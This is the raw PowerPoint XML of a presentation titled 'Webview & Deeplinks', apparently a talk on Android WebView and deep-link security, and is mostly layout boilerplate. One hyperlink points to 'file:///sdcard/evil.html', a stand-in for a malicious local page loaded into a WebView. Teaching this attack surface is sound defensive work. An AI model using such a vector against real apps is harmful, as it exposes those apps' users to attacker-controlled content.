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0" r:id="rId2"/>
    <p:sldId id="256" r:id="rId3"/>
    <p:sldId id="258" r:id="rId4"/>
    <p:sldId id="257" r:id="rId5"/>
    <p:sldId id="267" r:id="rId6"/>
    <p:sldId id="259" r:id="rId7"/>
    <p:sldId id="260" r:id="rId8"/>
    <p:sldId id="261" r:id="rId9"/>
    <p:sldId id="262" r:id="rId10"/>
    <p:sldId id="263" r:id="rId11"/>
    <p:sldId id="264" r:id="rId12"/>
    <p:sldId id="265" r:id="rId13"/>
    <p:sldId id="266" r:id="rId14"/>
    <p:sldId id="268" r:id="rId15"/>
    <p:sldId id="269" r:id="rId16"/>
    <p:sldId id="270" r:id="rId17"/>
    <p:sldId id="278" r:id="rId18"/>
    <p:sldId id="272" r:id="rId19"/>
    <p:sldId id="273" r:id="rId20"/>
    <p:sldId id="274" r:id="rId21"/>
    <p:sldId id="275" r:id="rId22"/>
    <p:sldId id="276" r:id="rId23"/>
    <p:sldId id="277" r:id="rId24"/>
    <p:sldId id="279" r:id="rId25"/>
    <p:sldId id="271"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00"/>
    <p:restoredTop sz="94634"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="100" d="100"/>
          <a:sy n="100" d="100"/>
        </p:scale>
        <p:origin x="98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22750-B0C6-FBCC-23E1-23AAAE94527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0F379C8-0706-EF59-B7C5-DD496CB20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A84EA7E-2662-9E6E-4919-B5F86209CE48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0C19C726-38CD-90A3-65F1-E9E27B046E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25A593-A602-54CE-9576-C3D37E0FE0A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4066552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3F4B8-BCA1-A9D8-0794-9F181B0F348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DC4952A-2F7A-0850-FEF6-C4FC5BE4DE1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722A87A-6B28-E9E9-B4B9-DC246C3EF782}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9536A2C6-C002-6959-D915-5C5B62A7E8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00C69-F4B1-1EB6-66FC-959240EF5802}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1140203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8FCA1-DCF2-3309-E185-842711338B4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EEDE890-9FED-EFD1-1F33-7254D85EC9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395510F-3ADA-A309-FF64-72FC1550E5D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05FEFFC1-FFDF-8C5D-3380-EA49DD809C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E30584-4DCE-056D-E76F-51EBD66C1453}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="723413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C7C1A-AAF0-7339-8ACA-5BC06F29838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CC32E32-02A0-0749-CBD8-B6655908586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0CE72DA-4134-5E0C-9F1D-E2AA887767F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5D8B9E4-B918-6683-E88F-A656F2217716}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1A86FF76-E9F6-94A9-71E6-EAF787ECB0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3F5211-AC7C-9C1E-AE05-AFF3FB0E141D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2095670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427B9-B81E-54AB-EDE7-36347211419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3007608-B70E-9FBF-9D20-40ED5A4F2C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D836E5B-05D0-47B2-2441-63C6BE26011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1B3FFAB-DB07-6DA1-72BA-6AAFF9CBD5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EE538F9-A923-75FA-98C5-CF5BE25CAB6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2596858-A4E7-F0ED-1938-E4DDDBAA581B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Footer Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8DBBC5FD-0EF3-E9E9-47FD-1AFC62916B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39F59E-F1F9-4B96-7D20-FD6EFD9E6A79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3288367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ACFEC-EBF7-9996-94D1-27AEB337452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3F1FBA0-F829-A7A6-FD0B-E1D8C2B3134C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A5F12AE8-0C1E-78DB-3010-4DAECA198B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F04037-BA3F-09BE-B552-632514932FEB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3162745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B09EE0-5EA8-C8C5-74F9-746684232E9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4D7F94E-FB2F-1EB4-3AFB-E112F06C00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675256-E9CF-9098-4EEA-B29481063633}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2162642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80898-0394-D36A-C216-5F6D365242B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083B22D-8450-8659-C1F3-1CC39374C0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478B8A6-24E7-742D-7E03-1E5A750EA6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D322BAC-5973-A406-F8C3-38A5B35E9951}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F03DE985-7F9C-4828-DCF6-3C44376D18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B3C533-5FF1-98C9-9961-564885A39DB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3042103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459F7-AA9F-B49F-E47B-E95455C5CD7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51E9082-5FF7-BDF1-97B7-3190FD390E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ED7CFA-DEB1-EB01-4326-97AF7FCD98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0190851-2484-3BF6-6445-72A2ADFFEE63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7315690-8F0F-886F-3175-C5EC9E5F8A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3BC71C-4FCB-3FEB-DEE9-290179DB24E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="176459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06BD6-3DE6-E16A-2F65-2E1A935CEC4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8C4741D-2FF6-2AFA-7759-17C36A32EED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08090F2-3EF9-A3AA-B019-B65591641F84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B276EF0-A02A-F8B3-3F7E-2CCEDAFDAD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ED8003-7755-EC46-C533-A84556C9DCB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2444222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9D9121-7C5C-6ABD-D885-8B8480E86D6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EEAFD16-5DD9-D030-985C-555982608CE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C306F14-49D1-D2AA-ABA1-3DE045041352}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{052246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10610DBC-ADFB-2A36-0476-48E253974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67F890-34D0-AB92-B0E3-D19CF52738EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0BF1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3194562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5E6499-3612-FD1F-4E86-908B9383F3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F637F86-0655-AC75-9E4D-45EECE4F79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F77435F-DAEA-FB59-A2D5-A38EFE6A83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2246F9-1B55-C047-AAB1-B5022490A1B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2/22/26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20A65955-F61A-8792-28BB-AA4835A677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6A31F0-2633-7D71-B4C7-D35AE67AE6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F1849F-FEE1-5C41-B3F1-AA6D29F56FC8}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14031679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file:///sdcard/evil.html"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gi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example.com/page" TargetMode="External"/><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gi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example.com/.well-known/assetlinks.json"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extBox 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{970374A2-3C7E-1648-490E-152D9B004532}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3502731" y="1542402"/>
            <a:ext cx="5186842" cy="2387918"/>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5200" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Webview &amp; Deeplinks</a:t>
            </a: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Picture 2" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1DB97FCB-0364-4FE4-70C6-54847DFF0455}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2525704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itfalls in Android WebView Implementation | by Niharika Arora | Tata 1mg  Technology | Medium">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{94B056C9-26B3-9B91-6C4B-5B6930CBD2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515"/>
            <a:ext cx="4221163"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A9AD159-ABC5-325F-0B42-BD06B627CDEC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6559004" y="1794225"/>
            <a:ext cx="3068392" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="4800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:cs typeface="Aharoni" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>WebView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0">
              <a:cs typeface="Aharoni" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E6B70BA-82A5-A69D-D0AC-24C3509C7A3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5170895" y="3287332"/>
            <a:ext cx="6471605" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
